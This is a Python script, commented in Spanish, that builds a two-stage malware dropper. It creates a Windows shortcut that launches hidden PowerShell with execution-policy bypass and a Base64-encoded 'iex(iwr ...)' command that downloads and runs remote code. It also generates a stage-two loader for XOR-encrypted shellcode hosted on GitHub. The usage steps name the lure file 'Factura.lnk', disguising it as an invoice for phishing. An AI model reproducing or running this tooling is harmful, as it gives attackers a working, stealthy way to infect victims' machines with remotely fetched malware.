#!/usr/bin/env python3
"""
Generador de LNK con stager de 2 etapas
Etapa 1: Mini PS1 embebido en LNK (descarga stage2)
Etapa 2: Loader completo (se hostea en GitHub como .txt)
"""

import os
import sys
import base64
import win32com.client

def create_2stage_lnk(stage1_url, output_lnk, icon_path=None):
    """
    Crea LNK con PowerShell minimalista que descarga stage2
    
    Args:
        stage1_url: URL del stage1.ps1 (mini downloader)
        output_lnk: Nombre del archivo .lnk a crear
        icon_path: Ruta opcional al icono .ico
    """
    
    # PowerShell ultra comprimido - solo descarga y ejecuta stage1
    ps_mini = f"iex(iwr '{stage1_url}' -UseBasicParsing).Content"
    
    # Codificar en Base64 UTF-16LE
    ps_bytes = ps_mini.encode('utf-16le')
    ps_b64 = base64.b64encode(ps_bytes).decode()
    
    # Crear LNK
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(output_lnk)
    
    # Usar PowerShell directamente con -EncodedCommand
    shortcut.TargetPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    shortcut.Arguments = f'-NoP -NonI -W Hidden -Exec Bypass -Enc {ps_b64}'
    shortcut.WorkingDirectory = os.path.expandvars('%TEMP%')
    shortcut.WindowStyle = 7  # Hidden
    
    if icon_path and os.path.exists(icon_path):
        shortcut.IconLocation = os.path.abspath(icon_path)
    
    shortcut.save()
    
    print(f"[✅] LNK de 2 etapas creado: {output_lnk}")
    print(f"\n[📋] Comando PowerShell ({len(ps_b64)} chars):")
    print(f"    {ps_mini}")
    print(f"\n[🔗] Arquitectura:")
    print(f"    LNK → Stage1 ({len(ps_mini)} bytes) → Stage2 (loader completo)")
    print(f"\n[⚠️] Requisitos:")
    print(f"    1. Subir stage1.ps1 a: {stage1_url}")
    print(f"    2. Subir stage2.txt (loader) a GitHub")
    print(f"    3. Subir agent_shellcode.enc a GitHub")
    print(f"\n[💡] Stage1 debe contener la URL de stage2")


def create_stage2_from_template(payload_url, xor_key, output_file='stage2.txt'):
    """
    Genera stage2.txt desde el template, reemplazando URLs y claves
    """
    template_path = 'stage2_template.ps1'
    
    if not os.path.exists(template_path):
        print(f"[✗] No se encuentra {template_path}")
        return False
    
    with open(template_path, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Reemplazar placeholders
    content = content.replace('PAYLOAD_URL_HERE', payload_url)
    content = content.replace('XOR_KEY_HERE', xor_key)
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(content)
    
    print(f"[✅] Stage2 generado: {output_file}")
    print(f"[📦] Tamaño: {len(content)} bytes")
    print(f"\n[⚡] Subir a GitHub como:")
    print(f"    https://raw.githubusercontent.com/USER/REPO/main/stage2.txt")
    
    return True


if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Generador de LNK con stager de 2 etapas')
    
    subparsers = parser.add_subparsers(dest='command', help='Comandos disponibles')
    
    # Comando: generar stage2
    stage2_parser = subparsers.add_parser('stage2', help='Generar stage2.txt desde template')
    stage2_parser.add_argument('--payload-url', required=True, help='URL del shellcode cifrado')
    stage2_parser.add_argument('--xor-key', required=True, help='Clave XOR')
    stage2_parser.add_argument('--output', default='stage2.txt', help='Archivo de salida')
    
    # Comando: crear LNK
    lnk_parser = subparsers.add_parser('lnk', help='Crear archivo LNK')
    lnk_parser.add_argument('--stage1-url', required=True, help='URL de stage1.ps1')
    lnk_parser.add_argument('--output', required=True, help='Nombre del .lnk')
    lnk_parser.add_argument('--icon', help='Ruta al icono .ico')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    if args.command == 'stage2':
        create_stage2_from_template(args.payload_url, args.xor_key, args.output)
    
    elif args.command == 'lnk':
        create_2stage_lnk(args.stage1_url, args.output, args.icon)
    
    print(f"\n[📖] Flujo completo:")
    print(f"    1. python create_lnk_2stage.py stage2 --payload-url URL --xor-key KEY")
    print(f"    2. Subir stage1.ps1, stage2.txt, agent_shellcode.enc a GitHub")
    print(f"    3. python create_lnk_2stage.py lnk --stage1-url URL --output Factura.lnk")
